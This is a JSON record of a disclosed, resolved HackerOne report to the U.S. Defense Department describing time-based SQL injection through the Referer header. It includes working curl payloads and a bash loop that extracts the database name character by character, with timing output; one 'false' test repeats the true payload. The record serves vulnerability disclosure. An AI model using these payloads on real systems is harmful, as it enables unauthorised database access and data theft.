@@ -1,0 +1,113 @@
+{
+  "id": 1018621,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDE4NjIx",
+  "url": "https://hackerone.com/reports/1018621",
+  "title": "[████] SQL Injections on Referer Header exploitable via Time-Based method",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-10-26T05:00:11.954Z",
+  "submitted_at": "2020-10-26T05:00:11.971Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "polygon35",
+    "url": "/polygon35",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/YrtGE3JVYrZuxxsQPScypX2r/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-11-02T21:40:40.797Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-10-30T14:45:42.536Z",
+  "team_member_agreed_on_going_public_at": "2020-11-02T21:40:40.686Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nSQL Injections on Referer Header exploitable via Time-Based method\n**Description:**\nhttps://owasp.org/www-community/attacks/SQL_Injection\n## Impact\nhttps://owasp.org/www-community/attacks/SQL_Injection\n## Step-by-step Reproduction Instructions\n\nFirst, vulnerable points:\nhttps://███████/███████/library.php?alert=\nhttps://██████████/████████/Chart01.php?alert=\nhttps://████████/████/Chart02.php?alert=\nhttps://██████████/█████████/Chart03.php?alert=\nhttps://████/█████Prod.php?alert=\nhttps://██████████/█████systems.php?alert=\nhttps://█████████/██████████db.php?alert=\n\n(Don't miss the alert GET parameter...)\n\nOkay, let's check the SQLi... lets use time and curl with a true condition (1=1), if 1=1, then, the server sleep 20 seconds else nothing (I just wrote false to make it explicit for you):\n\n```time curl -s -H \"Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\" --url \"https://████████/█████/Chart01.php?alert=\" ```\n\nOkay..then.. let's check the response: \n\n```Thank you - you may close this window\nreal\t0m21,447s\nuser\t0m0,029s\nsys\t0m0,000s```\n\nThe time is 21 seconds.. then.. let's update the if condition as false (1=2)\n\n```time curl -s -H \"Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\" --url \"https://████████/████████/Chart01.php?alert=\" ```\n\nResponse:\n\n```Thank you - you may close this window\nreal\t0m1,806s\nuser\t0m0,016s\nsys\t0m0,008s```\n\nHmm.. approx 2 seconds.. we have proof that's vuln.. let's try more..\nI want the first character of the current database name..\nlet's go for it!:\n\n```for i in {{a..z},{1..9}}; do echo \"Testing $i char:\"; time curl -s -H \"Referer: '+(select*from(select(if(substring(database(),1,1)='$i',sleep(20),false)))a)+'\" --url \"https://████/██████/Chart01.php?alert=\"; done```\n\nAnd there are only one-second answers from time except for the m!\n\n```\nTesting l char:\nThank you - you may close this window\nreal\t0m1,321s\nuser\t0m0,028s\nsys\t0m0,000s\nTesting m char:\nThank you - you may close this window\nreal\t0m21,299s\nuser\t0m0,019s\nsys\t0m0,010s\nTesting n char:\nThank you - you may close this window\nreal\t0m1,331s\nuser\t0m0,016s\nsys\t0m0,012s\n```\n\nThanks for reading!\n\nThere is one of these injection points that is supposedly fixed at report #995122 (report disclosed, resolved.. but it's not..)\n\n## Impact\n\nhttps://owasp.org/www-community/attacks/SQL_Injection",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 6,
+  "voters": [
+    "gamliel",
+    "dastan_9408",
+    "nafisaqil",
+    "shohag_sp",
+    "matrix_sorcerer",
+    "b35c90d99c67687f1bd2dd2"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
